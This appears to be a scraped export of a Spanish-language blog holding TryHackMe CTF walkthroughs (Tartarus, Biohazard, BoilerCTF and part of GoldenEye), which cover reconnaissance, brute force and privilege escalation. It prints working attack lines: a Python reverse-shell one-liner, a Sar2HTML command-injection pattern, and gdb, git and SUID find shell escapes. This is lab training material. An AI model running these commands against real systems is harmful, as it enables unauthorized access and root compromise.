el directorio de d4rckh encontramos nuestra flag user.txt.\nUSER - THIRTYTWO Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos con sudo pero con el usuario thirtytwo para ejecutar el comando /var/www/gdb, utilizamos gdb.\nEjecutamos el comando y logramos obtener una shell con este usario.\n1  sudo -u thirtytwo /var/www/gdb -nx -ex \u0026#39;!sh\u0026#39; -ex quit   USER - d4rckh Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos con sudo pero con el usuario d4rckh para ejecutar el comando git.\nAdemás en la carpeta principal de thirtytwo encontramos una nota donde habla de git.\nUtilizamos git. Ejecutamos el comando y logramos obtener una shell con el usuario d4rckh.\n1 2  sudo -u d4rckh /usr/bin/git -p help config #!/bin/sh   PRIVILEGE ESCALATION En la carpeta principal de d4rckh encontramos un script de python que elimina todo lo que esté en /home/cleanup/. Además este mismo script es ejecutado por el usuario root en un cron.\n1 2 3 4 5 6 7 8 9  #cleanup.py # -*- coding: utf-8 -*- #!/usr/bin/env python import os import sys try: os.system(\u0026#39;rm -r /home/cleanup/* \u0026#39;) except: sys.exit()   El script tiene permisos 777 por lo que cualquiera puede leer, escribir y ejecutar. Renombramos el archivo existente y creamos uno nuevo con una shell inversa (python).\nLogramos obtener una shell con usuario root y nuestra flag root.txt.\n","description":"Tartarus es una maquina de TryHackMe, realizamos ataque de fuerza bruta con Hydra y un wordlist con credenciales encontradas, con ello subimos una webshell y ejecutamos una shell inversa. Tras ejecutar una shell con GDB cambiamos a un segundo usuario. Ejecutamos Git junto con Sudo para acceder a otro usuario. Finalmente modificamos un script utilizado por un CronJob para obtener acfeso privilegiado.","id":54,"section":"posts","tags":["ftp","gdb","cron"],"title":"TryHackMe - Tartarus","uri":"https://sckull.github.io/posts/tartarus/"},{"content":"  Biohazard es una maquina de TryHackMe, enfocada a la tematica de Resident Evil presenta una serie de retos que permitieron el acceso a la maquina. Escalamos privilegios utilizando sudo.\nRoom    Titulo Biohazard      Descripción A CTF room based on the old-time survival horror game, Resident Evil. Can you survive until the end?   Puntos 980   Dificultad Media   Maker DesKel     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), ssh (22) y el puerto http (80) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12  # Nmap 7.80 scan initiated Tue Aug 11 17:52:02 2020 as: nmap -sV -o mini_scan biohazard.thm Nmap scan report for biohazard.thm (10.10.159.66) Host is up (0.25s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Aug 11 17:52:52 2020 -- 1 IP address (1 host up) scanned in 49.51 seconds   HTTP Encontramos una pagina web en el puerto 80.\nNIGHTMARE Esta pagina nos lleva hacia otra /mansionmain/ donde encontramos otra direccion en un comentario del codigo fuente.\nEn la nueva pagina encontramos un input donde debemos de ingresar un \u0026ldquo;emblema\u0026rdquo;.\nTambien encontramos en el codigo fuente una cadena codificada en base64, que al decodificarla nos muestra una nueva direccion.\nEn esta nueva direccion encontramos otra /artRoom/, además otra pagina que contiene un Lockpick.\nEn /artRoom/, vemos una nueva pagina que al visitarla encontramos la direccion o \u0026ldquo;el mapa\u0026rdquo; de la mansion.\n/diningRoom2F/, en esta direccion encontramos un mensaje codificado en un comentario del codigo fuente de la pagina.\nUtilizamos dcode.fr para obtener el mensaje codificado en el que nos indican una pagina donde podemos encontrar la gema azul.\nBlue Jewel\nEn /galleryRoom/ encontramos una nota en la que indica que los mensajes estan codificados, el primer crest contiene 18 letras decodificado y que debemos encontrar 4 crest para obtener el mensaje y la combinacion es: crest 1 + crest 2 + crest 3 + crest 4.\nUtilizamos CyberCheff para obtener el crest 2.\nEn /barRoom/ debemos de ingresar la falg lockpick, es la que encontramos en /artRoom/, al ingresarla nos redirige a una nueva pagina donde vemos nuevamente un input y una nota musical codificada.\nNOTA Musical\nUtilizamos CyberCheff para decodificar la cadena, en donde nos muestra una nueva \u0026ldquo;flag\u0026rdquo;.\nAl ingresar la \u0026ldquo;flag\u0026rdquo; en el input que encontramos nos redirige nuevamente a otra pagina donde vemos el emblema de oro y además nos muestra la pagina donde encontramos la \u0026ldquo;flag\u0026rdquo; y que debemos de regresar a la pagina anterior (en donde pide el emblema) e ingresar la \u0026ldquo;flag\u0026rdquo;.\nEmblema de ORO\nRegresamos a /diningRoom/ nuevamente e ingresamos la \u0026ldquo;flag\u0026rdquo; del emblema de oro, nos devuelve un mensaje.\nUtilizamos dcode.fr para obtener el mansaje donde nos indica la pagina donde esta la Shield key.\nVisitamos la pagina donde nos indica y vemos la \u0026ldquo;flag\u0026rdquo;.\nEn /attic/ nos pide ingresar el Shield key que supuestamente esta incrustado en la puerta, al ingresar la \u0026ldquo;flag\u0026rdquo; nos redirige hacia otra pagina donde encontramos otra nota en donde encontramos otro crest.\nUtilizamos CyberCheff para obtener el crest 4.\nEn /tigerStatusRoom/ nos pide una gema, ingresamos la \u0026ldquo;flag\u0026rdquo; Blue Jewel y nos devuelve un mensaje donde se encuentra el crest 1.\nUtilizamos CyberCheff para obtener el crest 1.\nEn /armorRoom/ nos pide tambien Shield key ingresamos y tambien, encontramos una nota en la nueva pagina, en donde encontramos la ultima crest.\nUtilizamos CyberCheff para obtener el crest 3.\nCRESTS Una vez con todas las crest encontradas utilizamos la combinacion dada, al decodificar el mensaje nos muestra unas credenciales para el servicio FTP.\nFTP Ingresamos por el servicio FTP con las credenciales que encontramos varios archivos entre ellos 3 imagenes jpg, un archivo de texto y una clave gpg.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  root@upset:~/thm/biohazard/tmp# ftp biohazard.thm Connected to biohazard.thm. 220 (vsFTPd 3.0.3) Name (biohazard.thm:root): hunter 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxrwxrwx 2 1002 1002 4096 Sep 20 2019 . drwxrwxrwx 2 1002 1002 4096 Sep 20 2019 .. -rw-r--r-- 1 0 0 7994 Sep 19 2019 001-key.jpg -rw-r--r-- 1 0 0 2210 Sep 19 2019 002-key.jpg -rw-r--r-- 1 0 0 2146 Sep 19 2019 003-key.jpg -rw-r--r-- 1 0 0 121 Sep 19 2019 helmet_key.txt.gpg -rw-r--r-- 1 0 0 170 Sep 20 2019 important.txt 226 Directory send OK. ftp\u0026gt; pwd 257 \u0026#34;/\u0026#34; is the current directory   1 2 3 4 5 6 7 8 9 10  #important.txt Jill, I think the helmet key is inside the text file, but I have no clue on decrypting stuff. Also, I come across a /hidden_closet/ door but it was locked. From, Barry   En una de las imagenes encontramos un archivo incrustado, pero al extraerlo y decodificarlo este no esta completo y seguramente el resto del mensaje esta en las imagenes restantes.\nEn la segunda imagen utilizamos strings y en la tercera binwalk para encontrar el mensaje restante.\n1 2 3 4 5 6 7 8 9 10  root@upset:~/thm/biohazard/tmp# binwalk -e 003-key.jpg DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.01 1930 0x78A Zip archive data, at least v2.0 to extract, uncompressed size: 14, name: key-003.txt 2124 0x84C End of Zip archive, footer length: 22 root@upset:~/thm/biohazard/tmp# cat _003-key.jpg.extracted/key-003.txt 3aXRoX3Zqb2x0 root@upset:~/thm/biohazard/tmp#   Utilizamos CyberCheff para obtener el mensaje completo, para obtener el mensaje en el archivo gpg.\nUtilizamos el mensaje o frase para obtener el mensaje, en donde encontramos la \u0026ldquo;flag\u0026rdquo; Helmet Key.\nUtilizamos la \u0026ldquo;flag\u0026rdquo; en /studyRoom/ el cual nos redirige hacia una nueva pagina y donde encontramos un archivo tar, el contenido de este es un archivo de texto con un nombre de usuario.\nEn /hidden_closet/ tambien nos pedia el Helmet Key al ingresarlo encontramos una pagina donde vemos dos archivos de texto. El primer archivo contiene un mensaje codificado.\n1 2  #MO_DISK1.txt wpbwbxr wpkzg pltwnhro, txrks_xfqsxrd_bvv_fy_rvmexa_ajk   En el segundo archivo encontramos una contraseña para SSH.\nSSH - UMBRELLA_GUEST/WEASKER Utilizamos las credenciales que encontramos y logramos obtener una shell con usuario umbrella_guest.\nDentro de la maquina encontramos una nota donde vemos una comversacion entre Jill y Chris, donde mencionan el disco (archivo) MO_DISK1.txt además una posible llave para el contenido de este y que esta cifrado. Utilizamos CyberCheff para obtener el mensaje que contiene la contraseña del usuario Weasker.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion viendo el archivo .history_bash y vemos que este usuario realizo el comando sudo su, utilizamos su contraseña para verificar que no sea la misma para el usuario root y efectivamente es esa. Logramos obtener una shell root y la flag root.txt.\nFAIL Por alguna razon no logramos encontrar la flag Emblem, pero esta se encuentra en diningRoom.\n","description":"Biohazard es una maquina de TryHackMe, enfocada a la tematica de Resident Evil presenta una serie de retos que permitieron el acceso a la maquina. Escalamos privilegios utilizando sudo.","id":55,"section":"posts","tags":["cyberchef","vigenere","ftp","steganography","steghide","binwalk"],"title":"TryHackMe - Biohazard","uri":"https://sckull.github.io/posts/biohazard/"},{"content":"  BoilerCTF es una maquina de TryHackMe, la herramienta para trazar estadisticas Sar2HTML tiene una vulnerabilidad RCE la cual explotamos para obtener una shell. En el movimiento lateral encontramos contraseñas en el log de acceso de SSH del usuario Basterd. Nuevamente obtuvimos acceso a otro usuario con una contraseña almacenada. Finalmente encontramos un fichero con permisos SUID la cual nos dio acceso privilegiado.\nRoom    Titulo Boiler CTF      Descripción Intermediate level CTF   Puntos 650   Dificultad Media   Maker MrSeth6797     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80), Webmin (10000) y el puerto ssh (55007) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13  # Nmap 7.80 scan initiated Tue Aug 11 21:20:00 2020 as: nmap -sV -o mini_scan boiler.thm Nmap scan report for boiler.thm (10.10.29.145) Host is up (0.25s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) 10000/tcp open http MiniServ 1.930 (Webmin httpd) 55007/tcp open unknown Service Info: OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Aug 11 21:21:19 2020 -- 1 IP address (1 host up) scanned in 78.77 seconds   Para verificar SSH en el puerto 55007 utilizamos netcat.\n1 2 3  root@upset:~/thm/boilerctf# nc boiler.thm 55007 SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8 ^C   FTP Ingresamos en el servicio FTP con las credenciales anonymous, encontramos un archivo que contiene un mensaje cifrado.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  root@upset:~/thm/boilerctf# ftp boiler.thm Connected to boiler.thm. 220 (vsFTPd 3.0.3) Name (boiler.thm:root): anonymous 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 ftp ftp 4096 Aug 22 2019 . drwxr-xr-x 2 ftp ftp 4096 Aug 22 2019 .. -rw-r--r-- 1 ftp ftp 74 Aug 21 2019 .info.txt 226 Directory send OK. ftp\u0026gt; get .info.txt local: .info.txt remote: .info.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for .info.txt (74 bytes). 226 Transfer complete. 74 bytes received in 0.00 secs (802.9514 kB/s) ftp\u0026gt; pwd 257 \u0026#34;/\u0026#34; is the current directory ftp\u0026gt; quit 221 Goodbye. root@upset:~/thm/boilerctf# cat .info.txt Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl! root@upset:~/thm/boilerctf#   Utilizamos dcode.fr para obtener el mensaje, pero no ayudo mucho.\nHTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8  root@upset:~/thm/boilerctf# gobuster dir -u http://boiler.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /index.html (Status: 200) /index.html (Status: 200) /joomla (Status: 301) /manual (Status: 301) /robots.txt (Status: 200) /robots.txt (Status: 200) /server-status (Status: 403)   En robots.txt encontramos varias direcciones \u0026ldquo;escondidas\u0026rdquo;, además de eso un mensaje \u0026ldquo;codificado\u0026rdquo;.\nUtilizamos ASCII to text para obtener un nueva cadena codificada.\nUtilizamos CyberChef para decodificar la cadena.\nUtilizamos CrackStation para obtener el mensaje que no sirve de mucho.\nGOBUSTER - JOOMLA Pagina en Joomla.\nUtilizamos gobuster para busqueda de directorios y archivos en /joomla.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  root@upset:~/thm/boilerctf# gobuster dir -u http://boiler.thm/joomla/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /_files (Status: 301) /_test (Status: 301) /~www (Status: 301) /administrator (Status: 301) /bin (Status: 301) /build (Status: 301) /cache (Status: 301) /components (Status: 301) /configuration.php (Status: 200) /images (Status: 301) /includes (Status: 301) /index.php (Status: 200) /index.php (Status: 200) /installation (Status: 301) /language (Status: 301) /layouts (Status: 301) /libraries (Status: 301) /LICENSE.txt (Status: 200) /media (Status: 301) /modules (Status: 301) /plugins (Status: 301) /README.txt (Status: 200) /templates (Status: 301) /tests (Status: 301) /tmp (Status: 301) /web.config.txt (Status: 200)   En /_files encontramos una cadena codificada.\nUtilizamos CyberChef para decodificar la cadena y encontramos un posible nombre de usuario.\nEn /_database encontramos una cadena cifrada.\nUtilizamos dcode.fr para decifrar el mensaje pero no sirvio de nada.\nSar2HTML - RCE En /_test encontramos Sar2HTML al buscar una vulnerabilidad en este software encontramos que podemos ejecutar comandos en la maquina. Para ello debemos de seleccionar el Sistema Operativo (OS) y en la URL _test/index.php?plot=;COMANDO colocamos nuestro comando a ejecutar y al final del dropdown en Select Host encontramos el resultado de nuestro comando ejecutado. Ejecutamos id.\nEjecutamos ls -lah y tambien logramos ver el resultado, donde vemos el archivo log.txt.\nHacemos cat al archivo, utilizamos CyberChef - Strip HTML tags para leer el html que se muestra y obtener el resultado limpio.\nUSER - WWW-DATA/BASTERD Encontramos en el archivo un log de acceso del servicio SSH donde se muestra el usuario basterd y su \u0026ldquo;contraseña\u0026rdquo;.\n1 2 3 4 5 6 7 8 9 10 11  Select HostHPUXLinuxSunOS Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22. Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: [... REDACTED ...] Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0) Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 10.10.170.50 port 49824 Aug 20 11:16:36 parrot sshd[2451]: pam_unix(sshd:session): session closed for user pentest Aug 20 12:24:38 parrot sshd[2443]: Received signal 15; terminating. Select Host FirstSelect Start Date First\t  Ejecutamos una shell inversa y obtenemos una shell con el usuario www-data.\n1  python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.0.0.1\u0026#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39;   Además utilizamos la contraseña que encontramos en el servicio SSH y obtenemos una shell con el usuario basterd.\nUSER - STONER En la carpeta principal de basterd encontramos un archivo que realiza una copia a /usr/local/backup y log en /home/stoner/bck.log de todo lo que existe en /home/stoner, además encontramos lo que parece ser una \u0026ldquo;contraseña\u0026rdquo; comentada.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  REMOTE=1.2.3.4 SOURCE=/home/stoner TARGET=/usr/local/backup LOG=/home/stoner/bck.log DATE=`date +%y\\.%m\\.%d\\.` USER=stoner #[... REDACTED ...] ssh $USER@$REMOTE mkdir $TARGET/$DATE if [ -d \u0026#34;$SOURCE\u0026#34; ]; then for i in `ls $SOURCE | grep \u0026#39;data\u0026#39;`;do echo \u0026#34;Begining copy of\u0026#34; $i \u0026gt;\u0026gt; $LOG scp $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE echo $i \u0026#34;completed\u0026#34; \u0026gt;\u0026gt; $LOG if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2\u0026gt;/dev/null` ];then rm $SOURCE/$i echo $i \u0026#34;removed\u0026#34; \u0026gt;\u0026gt; $LOG echo \u0026#34;####################\u0026#34; \u0026gt;\u0026gt; $LOG else echo \u0026#34;Copy not complete\u0026#34; \u0026gt;\u0026gt; $LOG exit 0 fi done else echo \u0026#34;Directory is not present\u0026#34; \u0026gt;\u0026gt; $LOG exit 0 fi   Utilizamos la \u0026ldquo;contraseña\u0026rdquo; y logramos obtener una shell con el usuario stoner y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con find para encontrar archivos con permisos SUID y vemos el comando/archivo find. Utilizamos find para obtener una shell root.\n1  /usr/bin/find . -exec /bin/sh -p \\; -quit   Obtenemos una shell con el usuario root.\nY nuestra flag root.txt.\n","description":"BoilerCTF es una maquina de TryHackMe, la herramienta para trazar estadisticas Sar2HTML tiene una vulnerabilidad RCE la cual explotamos para obtener una shell. En el movimiento lateral encontramos contraseñas en el log de acceso de SSH del usuario Basterd. Nuevamente obtuvimos acceso a otro usuario con una contraseña almacenada. Finalmente encontramos un fichero con permisos SUID la cual nos dio acceso privilegiado.","id":56,"section":"posts","tags":["ftp","vigenere","Sar2HTML","suid","ctf like"],"title":"TryHackMe - BoilerCTF","uri":"https://sckull.github.io/posts/boilerctf/"},{"content":"  GoldenEye es una maquina de TryHackMe, enfocada en la tematica de Golden Eye encontramos multiples usuarios los cuales utilizamos con Hydra en POP3 donde obtuvimos acceso y credenciales para Moodle que posteriormente nos devolvio a POP3 donde encontramos credenciales de administracion para Moodle donde luego explotamos una vulnerabilidad para obtener acceso. Finalmente explotamos una vulnerabilidad en el Kernel de Linux para escalar privilegios.\nRoom    Titulo GoldenEye      Descripción Bond, James Bond. A guided CTF.   Puntos 930   Dificultad Media   Maker ben     GOLDENEYE PART 1 NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80). ssl (55006), pop3 (55007) y el puerto smtp (25) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  # Nmap 7.80 scan initiated Wed Aug 5 17:03:08 2020 as: nmap -sV -o mini_scan golden.thm Nmap scan report for golden.thm (10.10.38.197) Host is up (0.25s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 25/tcp open smtp Postfix smtpd 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Aug 5 17:03:58 2020 -- 1 IP address (1 host up) scanned in 50.07 seconds # Nmap 7.80 scan initiated Wed Aug 5 17:02:54 2020 as: nmap -sV -p- -T5 -o big_scan golden.thm Warning: 10.10.38.197 giving up on port because retransmission cap hit (2). Nmap scan report for golden.thm (10.10.38.197) Host is up (0.25s latency). Not shown: 65449 closed ports, 82 filtered ports PORT STATE SERVICE VERSION 25/tcp open smtp Postfix smtpd 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) 55006/tcp open ssl/unknown 55007/tcp open pop3 Dovecot pop3d Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Aug 5 17:16:03 2020 -- 1 IP address (1 host up) scanned in 789.07 seconds   HTTP Encontramos una pagina web en el puerto 80, en donde mencionan un directorio /sev-home/.\nEn el codigo del script que se ejecuta en la pagina encontramos un posible nombre de usuario y contraseña, en el comentario tambien indica que la contraseña esta codificada.\nUtilizamos CyberChef para obtener en texto plano la contraseña.\nEn el directorio /sev-home/ encontramos un panel simple de logeo.\nAl ingresar con las credenciales que encontramos nos muestra un video con contenido en la pagina.\nEn uno de los parrafos muestra el siguiente mensaje, en el que indican que devemos de enviar un correo a un supervisor calificado, y que el servicio de pop3 esta configurado en un puerto alto que seria el 55007:\n1 2 3 4 5 6 7  Please email a qualified GNO supervisor to receive the online GoldenEye Operators Training to become an Administrator of the GoldenEye system Remember, since security by obscurity is very effective, we have configured our pop3 service to run on a very high non-default port   Además en el codigo fuente de la pagina encontramos otro posible nombre de usuario junto a otro que ya encontramos y que son \u0026ldquo;supervisores\u0026rdquo;.\nRUSTBUSTER/GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos en el directorio principal (/).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  ~ rustbuster v3.0.3 ~ by phra \u0026amp; ps1dr3x ~tarted at\t: 2020-08-05 17:13:55 GET\t200 OK\thttp://golden.thm/ GET 403 Forbidden http://golden.thm/.php GET 403 Forbidden http://golden.thm/.html GET 403 Forbidden http://golden.thm/.hta GET 403 Forbidden http://golden.thm/.hta.php GET 403 Forbidden http://golden.thm/.hta.html GET 403 Forbidden http://golden.thm/.hta.txt GET 403 Forbidden http://golden.thm/.htaccess GET 403 Forbidden http://golden.thm/.htaccess.php GET 403 Forbidden http://golden.thm/.htaccess.html GET 403 Forbidden http://golden.thm/.htaccess.txt GET 403 Forbidden http://golden.thm/.htpasswd GET 403 Forbidden http://golden.thm/.htpasswd.php GET 403 Forbidden http://golden.thm/.htpasswd.html GET 403 Forbidden http://golden.thm/.htpasswd.txt GET 200 OK http://golden.thm/index.html GET 200 OK http://golden.thm/index.html GET 403 Forbidden http://golden.thm/server-status [00:03:25] ######################################## 18444/18444 ETA: 00:00:00 req/s: 89 [?] Ended at: 2020-08-05 17:17:20   Utilizando GOBUSTER con las credenciales realizamos una busqueda de paginas y directorios en /sev-home/ pero no encontramos nada interesante.\nroot@upset:~/thm/goldeneye# gobuster dir -u http://golden.thm/sev-home/ -w /usr/share/wordlists/dirb/common.txt -P [... REDACTED ...] -U boris -q -t 50 -x php,html,txt /index.html (Status: 200) /index.html (Status: 200) POP3 - HYDRA Intentamos reutilizar la contraseña junto con los usuarios que encontramos en este servicio pero no funcionaron, por lo que utilizamos hydra para hacer un ataque de fuerza bruta junto con los usuarios y el wordlist rockyou.\nDespues de realizar mas de diez mil intentos no encontramos alguna contraseña (raro en una maquina de THM) con el wordlist rockyou cambiamos de wordlist a uno más pequeño, con el cual encontramos credenciales para los usuarios boris y natalya.\nBORIS - EMAIL Utilizamos las credenciales para leer los correos de boris al igual que en Fowsniff CTF - THM, encontramos otros usuarios xenia y alec. En los correos hablan sobre codigos de boris, estos codigos natalya ha podido romper. Tambien sobre un archivo escondido en el servidor.\ncorreo1 correo2 correo3  1 2 3 4 5 6 7 8 9 10 11 12 13 14  RETR 1 +OK 544 octets Return-Path: \u0026lt;root@127.0.0.1.goldeneye\u0026gt; X-Original-To: boris Delivered-To: boris@ubuntu Received: from ok (localhost [127.0.0.1]) by ubuntu (Postfix) with SMTP id D9E47454B1 for \u0026lt;boris\u0026gt;; Tue, 2 Apr 1990 19:22:14 -0700 (PDT) Message-Id: \u0026lt;20180425022326.D9E47454B1@ubuntu\u0026gt; Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT) From: root@127.0.0.1.goldeneye Boris, this is admin. You can electronically communicate to co-workers and students here. I\u0026#39;m not going to scan emails for security risks because I trust you and the other admins here. .     1 2 3 4 5 6 7 8 9 10 11 12 13 14  RETR 2 +OK 373 octets Return-Path: \u0026lt;natalya@ubuntu\u0026gt; X-Original-To: boris Delivered-To: boris@ubuntu Received: from ok (localhost [127.0.0.1]) by ubuntu (Postfix) with ESMTP id C3F2B454B1 for \u0026lt;boris\u0026gt;; Tue, 21 Apr 1995 19:42:35 -0700 (PDT) Message-Id: \u0026lt;20180425024249.C3F2B454B1@ubuntu\u0026gt; Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT) From: natalya@ubuntu Boris, I can break your codes! .     1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  RETR 3 +OK 921 octets Return-Path: \u0026lt;alec@janus.boss\u0026gt; X-Original-To: boris Delivered-To: boris@ubuntu Received: from janus (localhost [127.0.0.1]) by ubuntu (Postfix) with ESMTP id 4B9F4454B1 for \u0026lt;boris\u0026gt;; Wed, 22 Apr 1995 19:51:48 -0700 (PDT) Message-Id: \u0026lt;20180425025235.4B9F4454B1@ubuntu\u0026gt; Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT) From: alec@janus.boss Boris, Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn! Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages.... PS - Keep security tight or we will be compromised. .       'use strict'; var containerId = JSON.parse(\"\\\"5eef4290c6bb646f\\\"\"); var containerElem = document.getElementById(containerId); var codetabLinks = null; var codetabContents = null; var ids = []; if (containerElem) { codetabLinks = containerElem.querySelectorAll('.codetab__link'); codetabContents = containerElem.querySelectorAll('.codetab__content'); } for (var i = 0; i 0) { codetabContents[0].style.display = 'block'; }  NATALYA - EMAIL Utilizamos neuvamente telnet pero esta vez con las credenciales de natalya, encontramos en uno de los correos las credenciales del usuario xenia.\ncorreo1 correo2  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  RETR 1 +OK 631 octets Return-Path: \u0026lt;root@ubuntu\u0026gt; X-Original-To: natalya Delivered-To: natalya@ubuntu Received: from ok (localhost [127.0.0.1]) by ubuntu (Postfix) with ESMTP id D5EDA454B1 for \u0026lt;natalya\u0026gt;; Tue, 10 Apr 1995 19:45:33 -0700 (PDT) Message-Id: \u0026lt;20180425024542.D5EDA454B1@ubuntu\u0026gt; Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT) From: root@ubuntu Natalya, please you need to stop breaking boris\u0026#39; codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you. Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus. .     1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  RETR 2 +OK 1048 octets Return-Path: \u0026lt;root@ubuntu\u0026gt; X-Original-To: natalya Delivered-To: natalya@ubuntu Received: from root (localhost [127.0.0.1]) by ubuntu (Postfix) with SMTP id 17C96454B1 for \u0026lt;natalya\u0026gt;; Tue, 29 Apr 1995 20:19:42 -0700 (PDT) Message-Id: \u0026lt;20180425031956.17C96454B1@ubuntu\u0026gt; Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT) From: root@ubuntu Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it\u0026#39;s related to security...even if it\u0026#39;s not, just enter it in under the guise of \u0026#34;security\u0026#34;...it\u0026#39;ll get the change order escalated without much hassle :) Ok, user creds are: username: xenia password: [... REDACTED ...] Boris verified her as a valid contractor so just create the account ok? And if you didn\u0026#39;t have the URL on outr internal Domain: severnaya-station.com/gnocertdir **Make sure to edit your host file since you usually work remote off-network.... Since you\u0026#39;re a Linux user just point this servers IP to severnaya-station.com in /etc/hosts. .       'use strict'; var containerId = JSON.parse(\"\\\"ddf4a8c14cc81176\\\"\"); var containerElem = document.getElementById(containerId); var codetabLinks = null; var codetabContents = null; var ids = []; if (containerElem) { codetabLinks = containerElem.querySelectorAll('.codetab__link'); codetabContents = containerElem.querySelectorAll('.codetab__content'); } for (var i = 0; i 0) { codetabContents[0].style.display = 'block'; }  GOLDENEYE PART 2 Agregamos el siguiente dominio severnaya-station.com a nuestro archiv /etc/hosts junto a la IP de la maquina, y nos dirigimos a /gnocertdir. Encontramos lo que parece ser la plataforma Moodle.\nUtilizamos las credenciales de xenia para ingresar. En los mensajes de xenia encontramos un mensaje de doak (nuevo nombre de usuario) en donde habla sobre un curso en el que xenia esta involucrada.\nDOAK - HYDRA -\u0026gt; POP3 Nuevamente utilizamos hydra con el usuario doak en el puerto de pop3 (55007). Logramos obtener su contraseña.\nAl revisar uno de sus correos encontramos su usario y contraseña:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  RETR 1 +OK 606 octets Return-Path: \u0026lt;doak@ubuntu\u0026gt; X-Original-To: doak Delivered-To: doak@ubuntu Received: from doak (localhost [127.0.0.1]) by ubuntu (Postfix) with SMTP id 97DC24549D for \u0026lt;doak\u0026gt;; Tue, 30 Apr 1995 20:47:24 -0700 (PDT) Message-Id: \u0026lt;20180425034731.97DC24549D@ubuntu\u0026gt; Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT) From: doak@ubuntu James, If you\u0026#39;re reading this, congrats you\u0026#39;ve gotten this far. You know how tradecraft works right? Because I don\u0026#39;t. Go to our training site and login to my account....dig until you can exfiltrate further information...... username: dr_doak password: [... REDACTED ...] .   ADMIN - 